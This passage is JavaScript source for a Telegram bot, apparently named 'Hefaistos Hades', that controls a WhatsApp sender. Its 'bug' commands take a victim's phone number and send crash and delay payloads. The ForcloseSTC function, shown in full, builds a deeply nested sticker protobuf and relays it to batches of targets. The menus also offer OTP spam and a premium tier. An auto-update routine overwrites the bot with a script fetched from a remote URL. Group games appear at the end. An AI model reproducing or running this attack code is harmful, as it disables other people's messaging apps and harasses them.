<blockquote>「 𝖲𝗍𝖺𝗍𝗎𝗌𝖾𝖽 」</blockquote>
↯ Sender : ${senderStatus}
↯ Runtime : ${runtimeStatus}
`;
    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: fallbackMenu, parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    });
  }
});

// ==============================
// bot.action("/start") — BACK TO MAIN MENU
// ==============================
bot.action("/start", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "aktif" : "tidak";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<blockquote>•.¸ Hefaistos Hades ¸.•</blockquote>
↯ Developer: @shinracery
↯ Version: New
↯ Language: JavaScript

<blockquote>「 𝖲𝗍𝖺𝗍𝗎𝗌𝖾𝖽 」</blockquote>
↯ Sender : ${senderStatus}
↯ Runtime : ${runtimeStatus}
`;

  const styles = ["primary", "success", "danger"];
  let index = 0;

  const getKeyboard = () => ([
    [{
      text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮",
      callback_data: "/setting_menu",
      style: styles[index],
      icon_custom_emoji_id: "6163328887813051603"
    }]
  ]);

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: thumbnailUrl,
        caption: menuMessage,
        parse_mode: "HTML"
      },
      { reply_markup: { inline_keyboard: getKeyboard() } }
    );

    await ctx.answerCbQuery();

    const chatId = ctx.chat.id;
    const messageId = ctx.callbackQuery.message.message_id;

    const interval = setInterval(async () => {
      index = (index + 1) % styles.length;
      try {
        await ctx.telegram.editMessageReplyMarkup(
          chatId, messageId, null,
          { inline_keyboard: getKeyboard() }
        );
      } catch (e) { clearInterval(interval); }
    }, 3000);

  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description.includes("message is not modified")
    ) {
      await ctx.answerCbQuery();
    } else {
      console.error(error);
      try { await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi"); } catch (e) {}
    }
  }
});

// ==============================
// ACTION MENUS
// ==============================
bot.action("coming_soon", async (ctx) => {
  await ctx.answerCbQuery("⛔ Anda Telah Di Menu ⛔", { show_alert: true });
});

bot.action("menu_akhir", async (ctx) => {
  await ctx.answerCbQuery("⛔ Anda Telah Di Menu Akhir ⛔", { show_alert: true });
});

bot.action('/bug_menu', async (ctx) => {
  const bug_menuMenu = `
<blockquote>(Page 3/3) • BUG MENU
•.¸ Hefaistos Hades ¸.•
────────────────────
<tg-emoji emoji-id="5267231489610760977">👁‍🗨</tg-emoji>𝐈𝐍𝐈𝐓𝐈𝐀𝐋𝐈𝐙𝐄 𝐁𝐔𝐆

↯ /Clown • Delay Hard
↯ /Deadly • Delay Medium
↯ /Ghost • Delay Low
↯ /Clover • Delay Magic 
↯ /Kelzu • delay Level
↯ /Vortex • Delay Duration
────────────────────</blockquote>
`;
  const keyboard = [[
    { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }
  ]];
  try {
    await ctx.editMessageCaption(bug_menuMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    await ctx.answerCbQuery();
  } catch (error) {
    if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
      await ctx.answerCbQuery();
    } else {
      console.error("Error di bug_menu:", error);
      await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
    }
  }
});

bot.action('/setting_menu', async (ctx) => {
  const setting_menuMenu = `
<blockquote>☰ SYSTEM CONTROL PANEL 
(Page 2/3)
•.¸ 𝙷𝙴𝙵𝙰𝙸𝚂𝚃𝙾𝚂 𝙷𝙰𝙳𝙴𝚂 ¸.•
────────────────────

☰ CONNECT BOT / UPDATE
↯ /addpairing → Add Sender
↯ /killsession → Delete Sender
↯ /update → Auto Update

☰ OWNERS SETTINGS
↯ /addpremgrup → Add All Member
↯ /delpremgrup → Remove All Member
↯ /listpremgrup → List Group

☰ FEATURE FUN MENU
 /spamotp → OTP Spam
 /spotify → Search Lagu
────────────────────
Security Mode : ACTIVE 
Network       : Hefaistos Hades Core</blockquote>`;
  const keyboard = [
    [{ text: "𝐁𝐚𝐜𝐤", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5463167176099780578" }],
    [{ text: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "/bug_menu", style: "success", icon_custom_emoji_id: "5267231489610760977" }]
  ];
  try {
    await ctx.editMessageCaption(setting_menuMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    await ctx.answerCbQuery();
  } catch (error) {
    if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
      await ctx.answerCbQuery();
    } else {
      console.error("Error di setting_menu:", error);
      await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
    }
  }
});

//------------------(AUTO UPDATE)--------------------//
bot.command("update", async (ctx) => doUpdate(ctx));

const UPDATE_URL = "https://raw.githubusercontent.com/sanz-max/seraphineupdate/main/Asmo.js";
const thumbnailUp = "https://files.catbox.moe/j8ci57.jpg";
const UPDATE_FILE_PATH = "./Asmo.js";

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);
    https.get(url, (res) => {
      if (res.statusCode !== 200) {
        file.close(() => fs.unlink(filePath, () => {}));
        return reject(new Error(`HTTP_${res.statusCode}`));
      }
      res.pipe(file);
      file.on("finish", () => file.close(resolve));
    }).on("error", (err) => {
      file.close(() => fs.unlink(filePath, () => {}));
      reject(err);
    });
  });
}

async function doUpdate(ctx) {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu.", { parse_mode: "HTML" });
  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);
    await ctx.reply("✅ <b>Update berhasil!</b>\n♻ <i>Restarting bot...</i>", { parse_mode: "HTML" });
    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(`❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`, { parse_mode: "HTML" });
  }
}

//------------------(BUG MENU)--------------------//
const clickedUsers = {};

bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Example : /bug 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  await ctx.replyWithPhoto(
    { source: "./image/MagicClowerd.jpg" },
    {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Target : ${q}
⌑ Status : Ready
⌑ Note : No Spam Bug
⌑ Silahkan Pilih bug di bawah...
╘═——————————————═⬡</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒", callback_data: `delay_${target}` },
            { text: "𝖣𝖾𝗅𝖺𝗒 𝗆𝖾𝗇𝗍𝖺𝗅𝗂𝗍𝗒", callback_data: `fc_${target}` }
          ],
          [
            { text: "𝖡𝗅𝖺𝗇𝗄 𝖠𝗇𝖽𝗋𝗈𝗂𝖽", callback_data: `blank_${target}` },
            { text: "𝖡𝗎𝗅𝖽𝗈𝗓𝖾𝗋 𝖪𝗎𝗈𝗍𝖺", callback_data: `bulldozer_${target}` }
          ]
        ]
      }
    }
  );
});

bot.on("callback_query", async (ctx) => {
  const userId = ctx.from.id;
  const data = ctx.callbackQuery.data;
  const [key, target] = data.split("_");

  if (clickedUsers[userId]) return ctx.answerCbQuery("⚠️ Kamu sudah memilih tombol ini!", { show_alert: true });
  clickedUsers[userId] = true;

  await ctx.answerCbQuery();
  await ctx.deleteMessage();

  const methods = {
    delay: { name: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒", func: async () => { for (let i = 0; i < 1; i++) { await VsxCrashUi(sock, target); await sleep(3000); } } },
    blank: { name: "𝖡𝗅𝖺𝗇𝗄 𝖠𝗇𝖽𝗋𝗈𝗂𝖽", func: async () => { for (let i = 0; i < 80; i++) { await DeepTranquility(sock, target); await sleep(3000); } } },
    bulldozer: { name: "𝖡𝗎𝗅𝖽𝗈𝗓𝖾𝗋 𝖪𝗎𝗈𝗍𝖺", func: async () => { for (let i = 0; i < 90; i++) { await AxDFesix(sock, target); await sleep(3000); } } },
    fc: { name: "𝖣𝖾𝗅𝖺𝗒 𝗆𝖾𝗇𝗍𝖺𝗅𝗂𝗍𝗒", func: async () => { for (let i = 0; i < 40; i++) { await Tentacelz(sock, target); await sleep(3000); } } }
  };

  const method = methods[key];
  if (!method) return;

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  const msg = await ctx.replyWithPhoto(
    { source: "./image/MagicClowerd.jpg" },
    {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [░░░░░░░░░░] 0%
╘═——————————————═⬡</pre></blockquote>`,
      parse_mode: "HTML"
    }
  );

  const attack = method.func(target);

  for (let i = 1; i <= 10; i++) {
    const bar = "█".repeat(i) + "░".repeat(10 - i);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id, msg.message_id, null,
      `
<blockquote><pre>⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [${bar}] ${i * 10}%
╘═——————————————═⬡</pre></blockquote>`,
      { parse_mode: "HTML" }
    );
    await sleep(800);
  }

  await attack;

  await ctx.telegram.editMessageCaption(
    ctx.chat.id, msg.message_id, null,
    `
<blockquote><pre>⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [██████████] 100%
╘═——————————————═⬡</pre></blockquote>`,
    { parse_mode: "HTML" }
  );

  delete clickedUsers[userId];
});

//------------------(BEBAS SPAM)--------------------//
const bebasSpamCommands = [
  { cmd: "svipdelay", name: "svipdelay", func: () => MagicDelay },
  { cmd: "Vortex", name: "Vortex", func: () => MagicDelay },
  { cmd: "Kelzu", name: "Kelzu", func: () => ForcloseSTC },
  { cmd: "Clover", name: "Clover", func: () => ForcloseSTC },
  { cmd: "Ghost", name: "Ghost", func: () => MagicDelay },
  { cmd: "Deadly", name: "Deadly", func: () => MagicDelay },
  { cmd: "Clown", name: "Clown", func: () => MagicDelay }
];

for (const { cmd, name, func } of bebasSpamCommands) {
  bot.command(cmd, premGroupOnly(), async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPremiumUser(userId) && ctx.chat.type === "private") {
      return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
    }
    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

    const args = ctx.message.text.split(" ");
    if (!args[1]) return ctx.reply(`📌 Format: /${cmd} 628xxxx`, { parse_mode: "HTML" });

    const rawNumber = args[1];
    const target = formatTarget(rawNumber);
    if (!target) return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });

    const startAt = Date.now();
    await ctx.telegram.sendMessage(ctx.chat.id, `✅ ${name} process mengirim for ${rawNumber}`, { parse_mode: "Markdown" });

    queue.add(async () => {
      try {
        await func()(ctx, target);
        await ctx.telegram.sendMessage(ctx.chat.id, `✅ ${name} bug selesai untuk ${rawNumber}`, { parse_mode: "Markdown" });
      } catch (e) {
        await ctx.telegram.sendMessage(ctx.chat.id, `✅ ${name} bug gagal for ${rawNumber}`, { parse_mode: "Markdown" });
      }
    });
  });
}

//------------------(FORCLOSE FUNCTIONS)--------------------//
async function ForcloseSTC(target) {
  const sticker = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
    mimetype: "image/webp",
    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
    fileLength: "10610",
    mediaKeyTimestamp: "1775044724",
    stickerSentTs: "1775044724091",
  };
  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
  const encodeVarint = function(rb) { const buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
  const wrapLd = function(tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
  const MakLo = proto.Message.encode(proto.Message.fromObject({ stickerMessage: sticker })).finish();
  const inflate = function(tag, rayap) { let buf = MakLo; for (let i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
  const resolveJid = function(raw) { const s = String(raw || '').trim(); if (s.includes('@')) return s; return s.replace(/\D/g, '') + '@s.whatsapp.net'; };
  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(j => j.length > 15);
  const MAX_BATCH = 100, DELAY_MS = 2000;
  for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
    const crb = jids.slice(offset, offset + MAX_BATCH);
    if (offset !== 0) await new Promise(r => setTimeout(r, DELAY_MS));
    const idx = Math.floor(offset / MAX_BATCH) + 1;
    const suffix = idx > 1 ? ('n' + idx) : 'n';
    const CrBMsG = 'crb' + Date.now().toString(36).toUpperCase() + suffix;
    for (const tag of tol) {
      let bokep = null;
      for (let rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
        try { const decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
      }
      if (!bokep) continue;
      await sock.relayMessage('status@broadcast', bokep, {
        messageId: CrBMsG, statusJidList: crb,
        additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: crb.map(j => ({ tag: 'to', attrs: { jid: j }, content: [] })) }] }]
      });
    }
  }
}

//------------------(APPROVED GROUP CMDS)--------------------//
bot.command("approved", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa approve group.");
  const chatId = ctx.message.text.split(" ").slice(1)[0];
  if (!chatId) return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
  if (isGroupApproved(chatId)) return ctx.reply("⚠️ Group ini sudah di-approve.");
  approvedGroups.push(String(chatId)); saveApprovedGroups();
  if (pendingGroups.has(String(chatId))) { clearTimeout(pendingGroups.get(String(chatId)).timeout); pendingGroups.delete(String(chatId)); }
  try { await ctx.telegram.sendMessage(chatId, "✅ Group ini telah di-approve oleh owner. Bot sekarang aktif di sini."); } catch (e) {}
  return ctx.reply(`✅ Group ${chatId} berhasil di-approve.`);
});

bot.command("unapproved", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa mencabut approve.");
  const chatId = ctx.message.text.split(" ").slice(1)[0];
  if (!chatId) return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
  if (!isGroupApproved(chatId)) return ctx.reply("⚠️ Group ini belum di-approve.");
  approvedGroups = approvedGroups.filter(id => id !== String(chatId)); saveApprovedGroups();
  try { await ctx.telegram.sendMessage(chatId, "⚠️ Approval group ini dicabut oleh owner."); } catch (e) {}
  return ctx.reply(`✅ Approval group ${chatId} berhasil dicabut.`);
});

bot.command("listapprovedgroup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa melihat daftar.");
  if (!approvedGroups.length) return ctx.reply("📭 Belum ada group yang di-approve.");
  const text = approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n");
  return ctx.reply(`📋 Daftar group approved:\n\n${text}`);
});

//------------------(BLOCK CMD)--------------------//
bot.command("blockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) return ctx.reply("❌ Akses ditolak.");
  const commandName = normalizeCommandName(ctx.message.text.split(" ").slice(1)[0]);
  if (!commandName) return ctx.reply("🪧 Format: /blockcmd namacommand");
  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(commandName)) return ctx.reply("❌ Command ini tidak bisa diblokir.");
  if (blockedCommands.includes(commandName)) return ctx.reply(`⚠️ Command /${commandName} sudah diblokir.`);
  blockedCommands.push(commandName); saveBlockedCommands();
  return ctx.reply(`✅ Command /${commandName} berhasil diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) return ctx.reply("❌ Akses ditolak.");
  const commandName = normalizeCommandName(ctx.message.text.split(" ").slice(1)[0]);
  if (!commandName) return ctx.reply("🪧 Format: /unblockcmd namacommand");
  if (!blockedCommands.includes(commandName)) return ctx.reply(`⚠️ Command /${commandName} tidak sedang diblokir.`);
  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName); saveBlockedCommands();
  return ctx.reply(`✅ Command /${commandName} berhasil dibuka kembali.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ownerID)) return ctx.reply("❌ Akses ditolak.");
  if (!blockedCommands.length) return ctx.reply("✅ Tidak ada command yang sedang diblokir.");
  const list = blockedCommands.map((cmd, i) => `${i + 1}. /${cmd}`).join("\n");
  return ctx.reply(`📋 Daftar command yang diblokir:\n\n${list}`);
});

//------------------(PREMIUM GROUP)--------------------//
bot.command("addpremgrup", ownerOnly(), async (ctx) => {
  if (ctx.chat?.type === "private") return ctx.reply("❌ Pakai command ini di grup.");
  addPremGroup(ctx.chat.id);
  return ctx.reply(`✅ ☇ <b>${escapeHtml(ctx.chat?.title || "Unknown Group")}</b> berhasil ditambahkan sebagai Group premium`, { parse_mode: "HTML" });
});

bot.command("delpremgrup", ownerOnly(), async (ctx) => {
  if (ctx.chat?.type === "private") return ctx.reply("❌ Pakai command ini di grup.");
  delPremGroup(ctx.chat.id);
  return ctx.reply(`🗑 ☇ <b>${escapeHtml(ctx.chat?.title || "Unknown Group")}</b> berhasil dihapus sebagai group premium`, { parse_mode: "HTML" });
});

bot.command("listpremgrup", ownerOnly(), async (ctx) => {
  const db = loadPremGroups();
  if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");
  const lines = db.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n");
  return ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${lines}`, { parse_mode: "HTML" });
});

//------------------(GAME: TTT)--------------------//
bot.command("ttt", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  const chatId = ctx.chat.id;
  if (tttGames.has(chatId)) return ctx.reply("⚠️ Sudah ada game Tic Tac Toe yang berjalan di grup ini.");
  const gameId = Date.now().toString().slice(-6);
  const game = { id: gameId, board: tttNewBoard(), players: { X: ctx.from, O: null }, turn: "X", messageId: null, started: false };
  tttGames.set(chatId, game);
  const sent = await ctx.reply(`<blockquote>
🎮 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐆𝐀𝐌𝐄 🎮

❌ X : <b>${tttSafeName(ctx.from)}</b>
⭕ O : <b>Belum join</b>

<i>Klik tombol di bawah untuk join sebagai O</i>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "⭕ Join Game", callback_data: `tttjoin_${chatId}_${gameId}` }]] }
  });
  game.messageId = sent.message_id;
});

bot.command("tttstop", async (ctx) => {
  if (!tttGames.has(ctx.chat.id)) return ctx.reply("❌ Tidak ada game Tic Tac Toe yang sedang berjalan.");
  tttGames.delete(ctx.chat.id);
  return ctx.reply("🛑 Game Tic Tac Toe dihentikan.");
});

bot.command("mypoint", async (ctx) => {
  const row = getUserPoint(ctx.from.id);
  if (!row) return ctx.reply("📌 Kamu belum punya point.");
  return ctx.reply(`<blockquote>
🏅 𝐌𝐘 𝐏𝐎𝐈𝐍𝐓 🏅

👤 <b>${row.name}</b>
⭐ Point: <b>${row.points}</b>

🏆 Win: <b>${row.win}</b>
🤝 Draw: <b>${row.draw}</b>
💀 Lose: <b>${row.lose}</b>
</blockquote>`, { parse_mode: "HTML" });
});

bot.command("leaderboard", async (ctx) => {
  const top = getLeaderboard(10);
  if (!top.length) return ctx.reply("📌 Leaderboard masih kosong.");
  let text = `🏆 <b>LEADERBOARD TIC TAC TOE</b>\n\n`;
  top.forEach((u, i) => { text += `${i + 1}. <b>${u.name}</b> — ⭐ <b>${u.points}</b> (W:${u.win} D:${u.draw} L:${u.lose})\n`; });
  return ctx.reply(text, { parse_mode: "HTML" });
});

bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = tttGames.get(chatId);
    if (!game || game.id !== gameId) return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    if (game.players.O) return ctx.answerCbQuery("⚠️ Slot O sudah diisi", { show_alert: true });
    if (game.players.X.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu sudah jadi player X", { show_alert: true });
    game.players.O = ctx.from; game.started = true;
    await ctx.editMessageText(tttRender(game), { parse_mode: "HTML", reply_markup: tttBoardKeyboard(chatId, gameId, game.board) });
    return ctx.answerCbQuery("✅ Kamu join sebagai O");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const index = Number(ctx.match[3]);
    const game = tttGames.get(chatId);
    if (!game || game.id !== gameId) return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    if (!game.started) return ctx.answerCbQuery("⚠️ Game belum dimulai", { show_alert: true });
    const currentPlayer = game.turn === "X" ? game.players.X : game.players.O;
    if (!currentPlayer || currentPlayer.id !== ctx.from.id) return ctx.answerCbQuery("❌ Bukan giliran kamu", { show_alert: true });
    if (game.board[index] !== null) return ctx.answerCbQuery("⚠️ Kotak ini sudah terisi", { show_alert: true });
    game.board[index] = game.turn;
    const winner = tttWinner(game.board);
    if (winner) {
      const winnerUser = winner === "X" ? game.players.X : game.players.O;
      const loserUser = winner === "X" ? game.players.O : game.players.X;
      addWinPoint(winnerUser); addLosePoint(loserUser);
      await ctx.editMessageText(`<blockquote>
🏆 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

<i>🏅 Pemenang:</i>
<b>${tttSafeName(winnerUser)}</b> (${winner})

⭐ +3 point untuk pemenang
</blockquote>`, { parse_mode: "HTML", reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true) });
      tttGames.delete(chatId);
      return ctx.answerCbQuery("🏆 Menang!");
    }
    if (tttDraw(game.board)) {
      addDrawPoint(game.players.X); addDrawPoint(game.players.O);
      await ctx.editMessageText(`<blockquote>
🤝 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

<i>📜 Hasil:</i>
<b>SERI</b>

⭐ +1 point untuk kedua pemain
</blockquote>`, { parse_mode: "HTML", reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true) });
      tttGames.delete(chatId);
      return ctx.answerCbQuery("🤝 Seri");
    }
    game.turn = game.turn === "X" ? "O" : "X";
    await ctx.editMessageText(tttRender(game), { parse_mode: "HTML", reply_markup: tttBoardKeyboard(chatId, gameId, game.board) });
    return ctx.answerCbQuery("✅ Langkah diterima");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => ctx.answerCbQuery("⚠️ Game sudah selesai"));

//------------------(GAME: SUIT)--------------------//
bot.command("suit", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  const chatId = ctx.chat.id;
  if (suitGames.has(chatId)) return ctx.reply("⚠️ Sudah ada game Suit yang berjalan di grup ini.");
  const gameId = Date.now().toString().slice(-6);
  const game = { id: gameId, p1: ctx.from, p2: null, p1Choice: null, p2Choice: null, started: false, messageId: null };
  suitGames.set(chatId, game);
  const sent = await ctx.reply(`<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(ctx.from)}</b>
👤 Player 2: <b>Belum join</b>

<i>Klik tombol di bawah untuk join game.</i>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "⚔️ Join Suit", callback_data: `suitjoin_${chatId}_${gameId}` }]] }
  });
  game.messageId = sent.message_id;
});

bot.command("suitstop", async (ctx) => {
  if (!suitGames.has(ctx.chat.id)) return ctx.reply("❌ Tidak ada game Suit yang berjalan.");
  suitGames.delete(ctx.chat.id);
  return ctx.reply("🛑 Game Suit dibatalkan.");
});

bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = suitGames.get(chatId);
    if (!game || game.id !== gameId) return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    if (game.p2) return ctx.answerCbQuery("⚠️ Player 2 sudah ada", { show_alert: true });
    if (game.p1.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu sudah jadi player 1", { show_alert: true });
    game.p2 = ctx.from; game.started = true;
    await ctx.editMessageText(`<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(game.p1)}</b>
👤 Player 2: <b>${suitName(game.p2)}</b>

Silakan masing-masing pilih:
<i>(klik tombol, pilihan hanya terlihat oleh sistem)</i>
</blockquote>`, { parse_mode: "HTML", reply_markup: suitPickKeyboard(chatId, gameId) });
    return ctx.answerCbQuery("✅ Kamu join sebagai player 2");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const choice = String(ctx.match[3]);
    const game = suitGames.get(chatId);
    if (!game || game.id !== gameId) return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    if (!game.started || !game.p2) return ctx.answerCbQuery("⚠️ Game belum siap", { show_alert: true });
    if (ctx.from.id === game.p1.id) {
      if (game.p1Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p1Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else if (ctx.from.id === game.p2.id) {
      if (game.p2Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p2Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else return ctx.answerCbQuery("❌ Kamu bukan player game ini", { show_alert: true });

    if (!game.p1Choice || !game.p2Choice) {
      const p1Done = game.p1Choice ? "✅" : "⌛";
      const p2Done = game.p2Choice ? "✅" : "⌛";
      await ctx.editMessageText(`<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 ${suitName(game.p1)} ${p1Done}
👤 ${suitName(game.p2)} ${p2Done}

<i>Menunggu kedua pemain memilih...</i>
</blockquote>`, { parse_mode: "HTML", reply_markup: suitPickKeyboard(chatId, gameId) }).catch(() => {});
      return;
    }

    const result = suitWin(game.p1Choice, game.p2Choice);
    if (result === "draw") {
      addSuitDraw(game.p1); addSuitDraw(game.p2);
      await ctx.editMessageText(`<blockquote>
🤝 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

Hasil: <b>SERI</b>
</blockquote>`, { parse_mode: "HTML" });
      suitGames.delete(chatId);
      return;
    }
    const winner = result === "p1" ? game.p1 : game.p2;
    const loser = result === "p1" ? game.p2 : game.p1;
    addSuitWin(winner); addSuitLose(loser);
